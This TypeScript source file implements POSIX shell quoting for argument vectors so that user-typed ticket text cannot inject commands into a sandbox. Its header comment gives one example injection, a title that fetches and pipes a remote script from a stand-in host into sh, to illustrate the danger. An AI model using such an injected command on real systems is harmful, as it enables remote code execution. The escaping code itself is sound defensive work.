/**
 * Turning an argument vector into a shell command line, safely.
 *
 * The Docker host hands `argv` to `docker exec`, which never involves a
 * shell. The Cloudflare Sandbox SDK takes a command STRING, which does — so
 * the moment we target it, every argument becomes shell syntax unless
 * something stops it.
 *
 * That matters here more than it usually would, because the arguments are
 * not ours. An agent step's prompt carries the ticket's title, its
 * description and a reviewer's feedback, all typed by a person; a step's
 * required documents are typed into the pipeline builder. Joining those with
 * spaces would let a ticket titled `x"; curl evil.sh | sh; #` run whatever
 * it liked in the sandbox.
 *
 * The escaping is the POSIX one and it is airtight for `sh`: wrap the whole
 * argument in single quotes, and replace each single quote with `'\''` —
 * close the quoting, emit an escaped quote, reopen it. Inside single quotes a
 * shell interprets nothing at all, so there is no second case to get right.
 */

/** One argument, as the shell must see it. */
export function quoteOne(argument: string): string {
  // An empty argument still has to occupy a position on the command line.
  if (argument === '') return "''";
  // A conservative allowlist stays unquoted, so a log line reads as the
  // command somebody would have typed.
  if (/^[A-Za-z0-9_@%+=:,./-]+$/.test(argument)) return argument;
  return `'${argument.replaceAll("'", `'\\''`)}'`;
}

/** A whole argument vector, as one command line. */
export function quote(argv: readonly string[]): string {
  return argv.map(quoteOne).join(' ');
}
